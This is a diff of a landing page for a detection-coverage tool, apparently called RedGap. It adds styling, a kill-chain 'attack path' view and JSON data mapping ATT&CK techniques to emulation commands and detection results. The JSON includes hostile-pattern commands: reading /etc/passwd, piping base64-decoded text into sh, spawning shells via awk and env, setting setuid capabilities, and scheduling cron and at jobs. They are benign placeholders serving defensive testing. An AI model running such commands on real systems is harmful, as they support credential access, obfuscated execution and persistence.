@@ -198,8 +198,19 @@
   .tcol { background: var(--panel-2); border: 1px solid var(--line); border-radius: 12px; padding: 11px 9px; scroll-snap-align: start; }
   .tcol h4 { font-family: var(--mono); font-size: 10.5px; letter-spacing: 0.05em; text-transform: uppercase;
     color: var(--dim); margin: 0 0 11px; line-height: 1.35; min-height: 28px; font-weight: 600; }
-  .cell { border-radius: 9px; padding: 9px 10px; margin-bottom: 7px; border: 1px solid var(--line-2); background: var(--panel); font-size: 11px; transition: transform .1s; }
+  .cell { border-radius: 9px; padding: 9px 10px; margin-bottom: 7px; border: 1px solid var(--line-2); background: var(--panel); font-size: 11px;
+    transition: transform .1s, background-color .5s ease, border-color .5s ease, box-shadow .5s ease, color .5s ease; }
   .cell:hover { transform: translateY(-1px); }
+  .cell .id { transition: color .5s ease; }
+  /* --fix playback: a rule-gap cell closing red -> green pops once; base-rate cells pulse amber */
+  .cell.justclosed { animation: cellPop .55s ease; }
+  @keyframes cellPop { 0% { transform: none; } 32% { transform: translateY(-2px) scale(1.035); } 100% { transform: none; } }
+  .cell.pulse { animation: cellPulse 1.1s ease 1; }
+  @keyframes cellPulse { 0%, 100% { box-shadow: none; } 50% { box-shadow: 0 0 15px -3px var(--amber); } }
+  @media (prefers-reduced-motion: reduce) { .cell.justclosed, .cell.pulse { animation: none; } }
+  .playbtn { font-family: var(--mono); font-size: 13px; }
+  .playbtn.playing { color: var(--green-ink); border-color: color-mix(in srgb, var(--green) 45%, var(--line)); }
+  .playbtn[disabled] { opacity: .55; cursor: default; }
   .cell .id { font-family: var(--mono); font-weight: 700; font-size: 11.5px; }
   .cell .nm { color: var(--dim); font-size: 10.5px; margin-top: 3px; line-height: 1.32; }
   .cell.det { background: var(--green-bg); border-color: color-mix(in srgb, var(--green) 55%, var(--line)); }
@@ -235,6 +246,31 @@
   .step p { color: var(--dim); font-size: 14px; margin: 0 0 12px; }
   .step .code { margin: 16px 0 0; margin-top: auto; }
 
+  /* Rule-health card (redgap audit): firing / SILENT / out-of-corpus. SILENT is the row no
+     competitor has, so it gets the red-gap glow treatment. */
+  .rulehealth { margin-top: 30px; background: var(--panel); border: 1px solid var(--line); border-radius: var(--r); padding: 24px; }
+  .rh-head { display: flex; flex-wrap: wrap; gap: 18px 28px; align-items: flex-start; justify-content: space-between; }
+  .rh-head > div:first-child { flex: 1 1 380px; }
+  .rh-lede { color: var(--dim); font-size: 14px; margin: 0; max-width: 62ch; }
+  .rh-buckets { display: flex; gap: 10px; flex-wrap: wrap; }
+  .rh-b { text-align: center; border: 1px solid var(--line-2); border-radius: 10px; padding: 10px 14px; min-width: 78px; background: var(--panel-2); }
+  .rh-b .n { font-family: var(--mono); font-size: 22px; font-weight: 700; line-height: 1; }
+  .rh-b .k { font-family: var(--mono); font-size: 10px; letter-spacing: .06em; text-transform: uppercase; color: var(--dim); margin-top: 6px; }
+  .rh-b.firing .n { color: var(--green-ink); } .rh-b.firing { border-color: color-mix(in srgb, var(--green) 45%, var(--line)); }
+  .rh-b.silent .n { color: var(--red-ink); } .rh-b.silent { border-color: var(--red); box-shadow: 0 0 16px -6px var(--red); }
+  .rh-b.ooc .n { color: var(--faint-ink); }
+  .rh-rules { display: grid; gap: 10px; margin-top: 20px; }
+  .rh-rule { display: flex; flex-wrap: wrap; gap: 4px 12px; align-items: baseline; border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; background: var(--panel-2); }
+  .rh-rule.silent { border-color: var(--red); background: var(--red-bg); box-shadow: 0 0 16px -7px var(--red); }
+  .rh-rule.firing { border-color: color-mix(in srgb, var(--green) 45%, var(--line)); background: var(--green-bg); }
+  .rh-badge { font-family: var(--mono); font-size: 10.5px; letter-spacing: .05em; text-transform: uppercase; padding: 3px 9px; border-radius: 999px; flex: none; }
+  .rh-badge.firing { color: var(--green-ink); border: 1px solid color-mix(in srgb, var(--green) 55%, var(--line)); }
+  .rh-badge.silent { color: var(--red-ink); border: 1px solid var(--red); }
+  .rh-badge.ooc { color: var(--faint-ink); border: 1px solid var(--line-2); }
+  .rh-rule .rt { font-weight: 600; }
+  .rh-rule .rwhy { flex-basis: 100%; color: var(--dim); font-size: 13px; }
+  .rh-rule .rwhy .mono { color: var(--ink); }
+
   /* Flow / trust */
   .flow { display: grid; gap: 14px; }
   .flowrow { display: flex; flex-wrap: wrap; align-items: stretch; gap: 11px; }
@@ -269,6 +305,137 @@
   .cell[data-id], tr[data-id] { cursor: pointer; }
   tr[data-id]:hover td { background: var(--panel-2); }
   .cell[data-id]:hover { transform: translateY(-1px); }
+
+  /* Attack-path · kill-chain ribbon. Verdict-coded tiles threaded on a spine, mirroring the
+     matrix grammar. The red glow is reserved for rule-gaps only, exactly like the matrix. */
+  .ktag { font-family: var(--mono); font-size: 10.5px; text-transform: uppercase; letter-spacing: .05em;
+    padding: 2px 7px; border-radius: 5px; border: 1px solid var(--line-2); color: var(--dim); flex: none;
+    display: inline-block; }
+  .ktag.breadth { color: var(--green-ink); border-color: color-mix(in srgb, var(--green) 45%, var(--line)); }
+  .ktag.depth { color: var(--amber); border-color: color-mix(in srgb, var(--amber) 45%, var(--line)); }
+
+  .ap { margin-top: 4px; }
+  /* run standfirst (carries the trust-boundary line by TYPE, not the spoken-for LLM border) */
+  .ap-standfirst { font-family: var(--mono); font-size: 12.5px; color: var(--dim); letter-spacing: .01em; }
+  .ap-standfirst b { color: var(--ink); font-weight: 600; }
+  .ap-standfirst .d { color: var(--line-2); margin: 0 9px; }
+  /* big-numeral stat band — screenshot-safe headline (NOT the hero's boxed 4-col grid) */
+  .ap-stats { display: flex; flex-wrap: wrap; gap: 14px 40px; align-items: flex-end;
+    padding: 20px 0; border-top: 1px solid var(--line); border-bottom: 1px solid var(--line);
+    margin: 14px 0 18px; }
+  .ap-stat .n { font-family: var(--mono); font-size: clamp(28px, 4.4vw, 40px); font-weight: 700;
+    line-height: .9; letter-spacing: -.03em; }
+  .ap-stat .n.g { color: var(--green); } .ap-stat .n.r { color: var(--red); } .ap-stat .n.i { color: var(--ink); }
+  .ap-stat .n .tot { font-size: .5em; color: var(--dim); letter-spacing: 0; margin-left: 2px; font-weight: 600; }
+  .ap-stat .l { font-size: 12.5px; color: var(--dim); margin-top: 7px; }
+  /* phase pills — ranges derived from the data */
+  .ap-phases { display: flex; flex-wrap: wrap; gap: 10px; margin: 0 0 14px;
+    font-family: var(--mono); font-size: 11px; letter-spacing: .04em; text-transform: uppercase; }
+  .ap-ph { display: inline-flex; align-items: center; gap: 8px; padding: 6px 12px;
+    border: 1px solid var(--line); border-radius: 999px; background: var(--panel-2); color: var(--faint-ink); }
+  .ap-ph i { width: 8px; height: 8px; border-radius: 2px; flex: none; }
+  .ap-ph.b i { background: color-mix(in srgb, var(--green) 65%, var(--line)); }
+  .ap-ph.d i { background: color-mix(in srgb, var(--amber) 70%, var(--line)); }
+  .ap-ph b { font-weight: 700; color: var(--ink); }
+  .ap-ph.b b { color: var(--green-ink); } .ap-ph.d b { color: var(--amber); }
+  /* route caption — wraps, never scrolls (kills the junior breadcrumb) */
+  .ap-route { display: flex; flex-wrap: wrap; align-items: baseline; gap: 5px 8px; margin: 0 0 14px;
+    font-family: var(--mono); font-size: 12px; color: var(--dim); }
+  .ap-route .rl { color: var(--faint-ink); text-transform: uppercase; letter-spacing: .1em;
+    font-size: 10.5px; margin-right: 4px; }
+  .ap-route .ar { color: var(--faint-ink); }
+  .ap-route .rt { color: var(--ink); }
+  .ap-route .rt.gap { color: var(--red-ink); }
+  /* legend (reuses the coverage .sw swatches) */
+  .ap-legend { display: flex; flex-wrap: wrap; gap: 10px 20px; margin: 0 0 16px; font-size: 13px; color: var(--dim); }
+  .ap-legend > span { display: inline-flex; align-items: center; gap: 8px; }
+  .ap-legend em { font-style: normal; color: var(--red-ink); }
+  .ap-legend .ap-axis { color: var(--faint-ink); }
+  @media (max-width: 620px) { .ap-legend .ap-axis { flex-basis: 100%; } }
+  /* horizontal scroller — mirrors .matrix-scroll, so wide content scrolls INSIDE itself */
+  .rib-scroll { overflow-x: auto; padding: 8px 0 16px; scroll-behavior: smooth;
+    scrollbar-width: thin; scrollbar-color: var(--line-2) transparent; }
+  .rib-scroll::-webkit-scrollbar { height: 10px; }
+  .rib-scroll::-webkit-scrollbar-track { background: var(--panel-2); border-radius: 999px; }
+  .rib-scroll::-webkit-scrollbar-thumb { background: var(--line-2); border-radius: 999px; border: 2px solid var(--bg); }
+  .rib-scroll::-webkit-scrollbar-thumb:hover { background: var(--faint-ink); }
+  /* the ribbon: per-tactic columns + one continuous spine line behind the nodes */
+  .ribbon { position: relative; display: flex; gap: 12px; width: max-content; align-items: flex-start;
+    --head-h: 54px; --node-h: 34px; }
+  .rib-line { position: absolute; left: 0; right: 0; z-index: 0; height: 2px; background: var(--line-2);
+    top: calc(var(--head-h) + var(--node-h) / 2 - 1px); }
+  .rib-col { flex: 0 0 156px; min-width: 156px; display: flex; flex-direction: column; position: relative; }
+  /* column header — fixed height so every spine node aligns (robust continuous spine) */
+  .rib-head { height: var(--head-h); display: flex; flex-direction: column; justify-content: flex-end;
+    gap: 2px; padding: 0 3px 8px; overflow: hidden; }
+  .rib-head .ix { font-family: var(--mono); font-size: 10px; color: var(--faint-ink); letter-spacing: .04em; }
+  .rib-head .tac { font-family: var(--mono); font-size: 10.5px; letter-spacing: .05em; text-transform: uppercase;
+    color: var(--dim); font-weight: 600; line-height: 1.3; }
+  .rib-head.gap .tac { color: var(--red-ink); }
+  .rib-head.base .tac { color: var(--amber); }
+  /* spine node — opaque, sits over the line; ONLY rule-gaps glow (the punched hole) */
+  .rib-node { height: var(--node-h); display: flex; align-items: center; justify-content: center;
+    position: relative; z-index: 1; }
+  .rib-node .nd { border-radius: 999px; box-sizing: border-box; }
+  .rib-col.det .nd { width: 12px; height: 12px; background: var(--green); box-shadow: 0 0 8px -1px var(--green); }
+  .rib-col.gap-base .nd { width: 16px; height: 16px; background: var(--amber-bg); border: 1.5px solid var(--amber); }
+  .rib-col.gap-rule .nd { width: 18px; height: 18px; background: var(--red-bg); border: 1.5px solid var(--red);
+    box-shadow: 0 0 16px -6px var(--red), inset 0 0 7px -3px var(--red); }
+  /* step bead — verdict recipe lifted verbatim from the matrix .cell variants */
+  .bead { position: relative; width: 100%; margin-top: 14px; text-align: left;
+    display: flex; flex-direction: column; gap: 6px;
+    background: var(--panel); border: 1px solid var(--line-2); border-radius: 11px; padding: 9px 10px;
+    font-family: var(--sans); color: var(--ink); }
+  button.bead { appearance: none; font: inherit; cursor: default; }
+  .bead[data-ap-id] { cursor: pointer; transition: transform .1s ease, border-color .15s ease; }
+  .bead[data-ap-id]:hover { transform: translateY(-1px); }
+  .bead.det { background: var(--green-bg); border-color: color-mix(in srgb, var(--green) 55%, var(--line)); }
+  .bead.det .b-id { color: var(--green-ink); }
+  .bead.gap-rule { background: var(--red-bg); border-color: var(--red); box-shadow: 0 0 16px -6px var(--red); }
+  .bead.gap-rule .b-id { color: var(--red-ink); }
+  .bead.gap-base { background: var(--amber-bg); border-color: color-mix(in srgb, var(--amber) 55%, var(--line)); }
+  .bead.gap-base .b-id { color: var(--amber); }
+  .bead .b-top { display: flex; align-items: center; gap: 7px; }
+  .bead .b-no { flex: none; font-family: var(--mono); font-size: 10.5px; color: var(--dim);
+    background: var(--panel-2); border: 1px solid var(--line); border-radius: 999px;
+    width: 21px; height: 21px; display: grid; place-items: center; }
+  .bead .b-id { font-family: var(--mono); font-weight: 700; font-size: 12px; color: var(--ink); }
+  .bead .b-nm { color: var(--dim); font-size: 10.5px; line-height: 1.32; }
+  .bead .b-bridge { font-family: var(--mono); font-size: 10px; color: var(--dim); letter-spacing: .02em; }
+  .bead .b-chase { font-family: var(--mono); font-size: 10px; color: var(--dim); line-height: 1.4; }
+  /* connectors: node -> first bead, bead -> stacked bead; a chase descent tints red */
+  .bead.first::before, .bead.stacked::before, .rib-xref.first::before {
+    content: ""; position: absolute; left: 50%; top: -14px; transform: translateX(-50%);
+    width: 2px; height: 14px; background: var(--line-2); }
+  .bead.stacked.chase::before { background: var(--red); box-shadow: 0 0 8px -3px var(--red); }
+  /* cross-reference for a tactic opened only as a bridged secondary — dashed, never a step */
+  .rib-xref { position: relative; width: 100%; margin-top: 14px; text-align: left;
+    font-family: var(--mono); font-size: 11px; color: var(--dim);
+    background: transparent; border: 1px dashed var(--line-2); border-radius: 8px; padding: 7px 9px; }
+  button.rib-xref { appearance: none; cursor: default; }
+  .rib-xref[data-ap-id] { cursor: pointer; transition: color .15s ease, border-color .15s ease; }
+  .rib-xref[data-ap-id]:hover { color: var(--ink); border-color: var(--faint-ink); }
+  /* staggered "walk" reveal — layered on the existing .reveal/.in observer. Glow stays static. */
+  @media (prefers-reduced-motion: no-preference) {
+    .ap.reveal.in .bead, .ap.reveal.in .rib-xref {
+      animation: apRise .5s cubic-bezier(.4, 0, .2, 1) both;
+      animation-delay: calc(40ms * min(var(--i, 0), 14)); }
+    @keyframes apRise { from { opacity: .001; transform: translateY(9px); } to { opacity: 1; transform: none; } }
+  }
+  /* responsive reflow — grouped tactic rows, verdict-coloured left rules, depth preserved */
+  @media (max-width: 640px) {
+    .rib-scroll { overflow-x: visible; }
+    .ribbon { display: block; width: auto; }
+    .rib-line { display: none; }
+    .rib-node { display: none; }
+    .rib-col { border-left: 2px solid var(--line-2); padding-left: 14px; margin-bottom: 8px; }
+    .rib-col.gap-rule { border-left-color: var(--red); box-shadow: inset 2px 0 14px -10px var(--red); }
+    .rib-col.gap-base { border-left-color: color-mix(in srgb, var(--amber) 55%, var(--line)); }
+    .rib-head { height: auto; flex-direction: row; align-items: baseline; gap: 8px; padding: 8px 0 4px; }
+    .bead, .rib-xref { margin-top: 8px; }
+    .bead.first::before, .bead.stacked::before, .rib-xref.first::before { display: none; }
+  }
+  @media (max-width: 480px) { .ap-stats { gap: 12px 28px; } }
 
   /* Detection Playground drawer */
   .dback { position: fixed; inset: 0; background: #000a; backdrop-filter: blur(3px);
@@ -326,6 +493,7 @@
     </a>
     <nav class="topnav" aria-label="Primary">
       <a href="#coverage" class="hs">Coverage</a>
+      <a href="#attackpath" class="hs">Attack path</a>
       <a href="#use" class="hs">How to use</a>
       <a href="#trust" class="hs">Trust boundary</a>
       <a href="#run">Run it</a>
@@ -365,7 +533,7 @@
       <div class="stat reveal"><div class="n g" id="s-det">34</div><div class="l">techniques your rules caught</div></div>
       <div class="stat reveal"><div class="n r" id="s-gap">17</div><div class="l">blind spots surfaced</div></div>
       <div class="stat reveal"><div class="n">122</div><div class="l">real SigmaHQ rules parsed, 0 crashes</div></div>
-      <div class="stat reveal"><div class="n">333</div><div class="l">tests, fully offline in CI</div></div>
+      <div class="stat reveal"><div class="n">371</div><div class="l">tests, fully offline in CI</div></div>
     </div>
   </div>
 </header>
@@ -385,6 +553,8 @@
         <button id="tb-fix" aria-pressed="false" onclick="setView('fixed')">after&nbsp;--fix</button>
         <button id="tb-custom" aria-pressed="false" onclick="setView('custom')" style="display:none">your report</button>
       </div>
+      <button id="tb-play" class="btn playbtn" type="button" onclick="playFix()"
+        title="Animate redgap run --fix closing every rule-gap, red to green">▶&nbsp;play&nbsp;<span class="mono">--fix</span></button>
       <label class="btn" style="cursor:pointer;margin:0">
         <input type="file" id="upload" accept=".json,application/json" class="sr-only" />
         ↥ Upload your coverage.json
@@ -412,6 +582,43 @@
         <tbody id="tbody"></tbody>
       </table>
     </div>
+  </div>
+</section>
+
+<section id="attackpath">
+  <div class="wrap">
+    <div class="eyebrow reveal">Adaptive chaining · <span class="mono">redgap run --adaptive</span></div>
+    <h2 class="reveal">The attack path, not just the checklist</h2>
+    <p class="sub reveal">A flat sweep tells you <em>which</em> techniques slip through. The adaptive
+      planner tells you the <b>story</b>: it opens an untested tactic first
+      (<b style="color:var(--green-ink)">breadth</b>), then piles onto a tactic already showing a gap
+      (<b style="color:var(--amber)">depth</b>) — a realistic kill-chain. The order is the planner's;
+      <b>every verdict is still the engine's</b>.</p>
+
+    <div class="ap reveal">
+      <div class="ap-standfirst" id="ap-standfirst"></div>
+      <div class="ap-stats" id="ap-stats"></div>
+      <div class="ap-phases" id="ap-phases"></div>
+      <div class="ap-route" id="ap-route"></div>
+
+      <div class="ap-legend" aria-hidden="true">
+        <span><i class="sw g"></i> detected</span>
+        <span><i class="sw r"></i> gap · rule <em>(the ring glows)</em></span>
+        <span><i class="sw a"></i> gap · base-rate</span>
+        <span class="ap-axis">&rarr; breadth: a new tactic each step&nbsp;·&nbsp;&darr; depth: the gap-chase piles on</span>
+      </div>
+
+      <div class="rib-scroll">
+        <div class="ribbon" id="ap-ribbon" role="group"
+             aria-label="Adaptive attack path: 12 steps threaded across 11 ATT&amp;CK tactics in kill-chain order"></div>
+      </div>
+    </div>
+
+    <p class="dim reveal" style="font-size:13px;margin-top:20px">The coverage grid above is
+      <b>byte-identical</b> whether you run the plain sweep or <span class="mono">--adaptive</span> — a
+      test asserts it. The planner authors only the order and the “why”; it has no field to write a
+      verdict into, so the path can never contradict the grid.
+      <a class="ln" href="https://github.com/befnoz/redgap/tree/main/docs/samples/adaptive" target="_blank" rel="noopener">See the committed artifact ↗</a></p>
   </div>
 </section>
 
@@ -443,6 +650,20 @@
           <span style="color:var(--green-ink)">green</span>. Wire RedGap into CI so a new gap fails the build.</p>
         <div class="code"><span class="p">$</span> redgap run --fix</div>
       </div>
+    </div>
+
+    <div class="rulehealth reveal" id="rulehealth">
+      <div class="rh-head">
+        <div>
+          <div class="eyebrow" style="margin-bottom:8px">Rule health · <span class="mono">redgap audit</span></div>
+          <h3 style="margin:0 0 6px">Which of your rules fire — and which are <span class="gapword">SILENT</span></h3>
+          <p class="rh-lede">A rule can pass <span class="mono">sigma-cli</span> validation, be tagged to the right
+            technique, and still fire on <em>zero</em> real events — false confidence a linter can't see. No other
+            tool in the comparison surfaces it. Live example below: <span class="mono">examples/my-sigma</span>.</p>
+        </div>
+        <div class="rh-buckets" id="rh-buckets"></div>
+      </div>
+      <div class="rh-rules" id="rh-rules"></div>
     </div>
   </div>
 </section>
@@ -557,6 +778,237 @@
   </div>
 </noscript>
 
+<script type="application/json" id="attackpath-data">
+{
+  "planner": "adaptive-heuristic",
+  "stop": {
+    "reason": "max_steps",
+    "steps_taken": 12
+  },
+  "summary": {
+    "steps": 12,
+    "detected": 8,
+    "gaps": 4,
+    "gap_techniques": [
+      "T1003.008",
+      "T1005",
+      "T1552.004",
+      "T1560.001"
+    ],
+    "tactics_covered": 11
+  },
+  "steps": [
+    {
+      "step": 1,
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactics": [
+        "Discovery"
+      ],
+      "detected": true,
+      "gap_type": "",
+      "why": "seed - first catalog technique",
+      "source": "heuristic"
+    },
+    {
+      "step": 2,
+      "id": "T1592.004",
+      "name": "Gather Victim Host Information: Client Configurations",
+      "tactics": [
+        "Reconnaissance"
+      ],
+      "detected": true,
+      "gap_type": "",
+      "why": "breadth - opens untouched tactic Reconnaissance",
+      "source": "heuristic"
+    },
+    {
+      "step": 3,
+      "id": "T1053.002",
+      "name": "Scheduled Task/Job: At",
+      "tactics": [
+        "Privilege Escalation",
+        "Execution",
+        "Persistence"
+      ],
+      "detected": true,
+      "gap_type": "",
+      "why": "breadth - opens untouched tactic Privilege Escalation",
+      "source": "heuristic"
+    },
+    {
+      "step": 4,
+      "id": "T1027",
+      "name": "Obfuscated Files or Information",
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "detected": true,
+      "gap_type": "",
+      "why": "breadth - opens untouched tactic Defense Evasion",
+      "source": "heuristic"
+    },
+    {
+      "step": 5,
+      "id": "T1003.008",
+      "name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "tactics": [
+        "Credential Access"
+      ],
+      "detected": false,
+      "gap_type": "rule",
+      "why": "breadth - opens untouched tactic Credential Access",
+      "source": "heuristic"
+    },
+    {
+      "step": 6,
+      "id": "T1005",
+      "name": "Data from Local System",
+      "tactics": [
+        "Collection"
+      ],
+      "detected": false,
+      "gap_type": "base_rate",
+      "why": "breadth - opens untouched tactic Collection",
+      "source": "heuristic"
+    },
+    {
+      "step": 7,
+      "id": "T1071.001",
+      "name": "Application Layer Protocol: Web Protocols",
+      "tactics": [
+        "Command and Control"
+      ],
+      "detected": true,
+      "gap_type": "",
+      "why": "breadth - opens untouched tactic Command and Control",
+      "source": "heuristic"
+    },
+    {
+      "step": 8,
+      "id": "T1048.003",
+      "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+      "tactics": [
+        "Exfiltration"
+      ],
+      "detected": true,
+      "gap_type": "",
+      "why": "breadth - opens untouched tactic Exfiltration",
+      "source": "heuristic"
+    },
+    {
+      "step": 9,
+      "id": "T1485",
+      "name": "Data Destruction",
+      "tactics": [
+        "Impact"
+      ],
+      "detected": true,
+      "gap_type": "",
+      "why": "breadth - opens untouched tactic Impact",
+      "source": "heuristic"
+    },
+    {
+      "step": 10,
+      "id": "T1552.001",
+      "name": "Unsecured Credentials: Credentials In Files",
+      "tactics": [
+        "Credential Access"
+      ],
+      "detected": true,
+      "gap_type": "",
+      "why": "gap-chase - Credential Access already shows a gap",
+      "source": "heuristic"
+    },
+    {
+      "step": 11,
+      "id": "T1552.004",
+      "name": "Unsecured Credentials: Private Keys",
+      "tactics": [
+        "Credential Access"
+      ],
+      "detected": false,
+      "gap_type": "rule",
+      "why": "gap-chase - Credential Access already shows a gap",
+      "source": "heuristic"
+    },
+    {
+      "step": 12,
+      "id": "T1560.001",
+      "name": "Archive Collected Data: Archive via Utility",
+      "tactics": [
+        "Collection"
+      ],
+      "detected": false,
+      "gap_type": "rule",
+      "why": "gap-chase - Collection already shows a gap",
+      "source": "heuristic"
+    }
+  ]
+}
+</script>
+
+<script type="application/json" id="scorecard-data">
+{
+  "summary": {
+    "loaded": 3,
+    "excluded": 0,
+    "firing": 1,
+    "silent": 1,
+    "out_of_corpus": 1,
+    "unevaluable": 0,
+    "detected": 1
+  },
+  "rules_dir": "examples/my-sigma",
+  "rules": [
+    {
+      "id": "aaaa1111-0000-4000-8000-000000000001",
+      "title": "Local Account Enumeration via /etc/passwd",
+      "status": "firing",
+      "technique_ids": [
+        "T1087.001"
+      ],
+      "in_corpus": [
+        "T1087.001"
+      ],
+      "fired_on": [
+        "T1087.001"
+      ],
+      "silent_detail": []
+    },
+    {
+      "id": "aaaa1111-0000-4000-8000-000000000002",
+      "title": "OS Credential Dumping (mimikatz)",
+      "status": "silent",
+      "technique_ids": [
+        "T1003.008"
+      ],
+      "in_corpus": [
+        "T1003.008"
+      ],
+      "fired_on": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1003.008",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "aaaa1111-0000-4000-8000-000000000003",
+      "title": "Rundll32 Execution (Windows)",
+      "status": "out_of_corpus",
+      "technique_ids": [
+        "T1218.011"
+      ],
+      "in_corpus": [],
+      "fired_on": [],
+      "silent_detail": []
+    }
+  ]
+}
+</script>
+
 <script type="application/json" id="data">
 {
   "baseline": {
@@ -572,6 +1024,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000087",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000087"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cat /etc/passwd",
           "telemetry": [
@@ -603,6 +1059,8 @@
         "detected": false,
         "gap_type": "base_rate",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "ps aux",
           "telemetry": [
@@ -631,6 +1089,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000136",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000136"
+        ],
+        "depth": 1,
         "detail": {
           "command": "useradd -M -N -s /usr/sbin/nologin svc_demo",
           "telemetry": [
@@ -670,6 +1132,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "c21c4eaa-ba2e-419a-92b2-8371703cbe21",
+        "rules": [
+          "c21c4eaa-ba2e-419a-92b2-8371703cbe21"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cp /bin/true /tmp/redgap_demo_suid",
           "telemetry": [
@@ -724,6 +1190,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "touch -r /etc/hostname /tmp/redgap_agent_file",
           "telemetry": [
@@ -760,6 +1228,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "42df45e7-e6e9-43b5-8f26-bec5b39cc239",
+        "rules": [
+          "42df45e7-e6e9-43b5-8f26-bec5b39cc239"
+        ],
+        "depth": 1,
         "detail": {
           "command": "uname -a",
           "telemetry": [
@@ -794,6 +1266,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa",
+        "rules": [
+          "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cat /etc/resolv.conf",
           "telemetry": [
@@ -828,6 +1304,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "676381a6-15ca-4d73-a9c8-6a22e970b90d",
+        "rules": [
+          "676381a6-15ca-4d73-a9c8-6a22e970b90d"
+        ],
+        "depth": 1,
         "detail": {
           "command": "groups",
           "telemetry": [
@@ -862,6 +1342,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "c9d8b7fd-78e4-44fe-88f6-599135d46d60",
+        "rules": [
+          "c9d8b7fd-78e4-44fe-88f6-599135d46d60"
+        ],
+        "depth": 1,
         "detail": {
           "command": "grep falcond /etc/passwd || true",
           "telemetry": [
@@ -897,6 +1381,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72",
+        "rules": [
+          "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72"
+        ],
+        "depth": 1,
         "detail": {
           "command": "find /etc -name hosts",
           "telemetry": [
@@ -931,6 +1419,8 @@
         "detected": false,
         "gap_type": "base_rate",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "whoami",
           "telemetry": [
@@ -963,6 +1453,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "dpkg -l || true",
           "telemetry": [
@@ -999,6 +1491,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "ba592c6d-6888-43c3-b8c6-689b8fe47337",
+        "rules": [
+          "ba592c6d-6888-43c3-b8c6-689b8fe47337"
+        ],
+        "depth": 1,
         "detail": {
           "command": "echo bHM= | base64 -d | sh",
           "telemetry": [
@@ -1041,6 +1537,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "34979410-e4b5-4e5d-8cfb-389fdff05c12",
+        "rules": [
+          "34979410-e4b5-4e5d-8cfb-389fdff05c12"
+        ],
+        "depth": 1,
         "detail": {
           "command": "touch /tmp/redgap_imm && chattr -i /tmp/redgap_imm 2>/dev/null || true",
           "telemetry": [
@@ -1084,6 +1584,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57",
+        "rules": [
+          "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57"
+        ],
+        "depth": 1,
         "detail": {
           "command": "touch /tmp/redgap_shred && shred -u /tmp/redgap_shred",
           "telemetry": [
@@ -1127,6 +1631,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "cat /sys/class/dmi/id/product_name 2>/dev/null || true",
           "telemetry": [
@@ -1159,6 +1665,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "8c1a5675-cb85-452f-a298-b01b22a51856",
+        "rules": [
+          "8c1a5675-cb85-452f-a298-b01b22a51856"
+        ],
+        "depth": 1,
         "detail": {
           "command": "awk 'BEGIN {system(\"/bin/sh -c id\")}'",
           "telemetry": [
@@ -1206,6 +1716,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "bed978f8-7f3a-432b-82c5-9286a9b3031a",
+        "rules": [
+          "bed978f8-7f3a-432b-82c5-9286a9b3031a"
+        ],
+        "depth": 1,
         "detail": {
           "command": "env /bin/sh -c id",
           "telemetry": [
@@ -1249,6 +1763,8 @@
         "detected": false,
         "gap_type": "base_rate",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "command -v python3 >/dev/null 2>&1 && python3 -c \"print('redgap')\" || true",
           "telemetry": [
@@ -1283,6 +1799,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "6b14bac8-3e3a-4324-8109-42f0546a347f",
+        "rules": [
+          "6b14bac8-3e3a-4324-8109-42f0546a347f"
+        ],
+        "depth": 1,
         "detail": {
           "command": "printf '* * * * * /bin/true\\n' > /tmp/rgcron && crontab /tmp/rgcron || true",
           "telemetry": [
@@ -1328,6 +1848,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "d2d642d7-b393-43fe-bae4-e81ed5915c4b",
+        "rules": [
+          "d2d642d7-b393-43fe-bae4-e81ed5915c4b"
+        ],
+        "depth": 1,
         "detail": {
           "command": "echo /bin/true | at now + 1 hour || true",
           "telemetry": [
@@ -1379,6 +1903,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "ed447910-bc30-4575-a598-3a2e49516a7a",
+        "rules": [
+          "ed447910-bc30-4575-a598-3a2e49516a7a"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cp /bin/true /tmp/rgcap && setcap cap_setuid+ep /tmp/rgcap || true",
           "telemetry": [
@@ -1427,6 +1955,8 @@
         "detected": false,
         "gap_type": "base_rate",
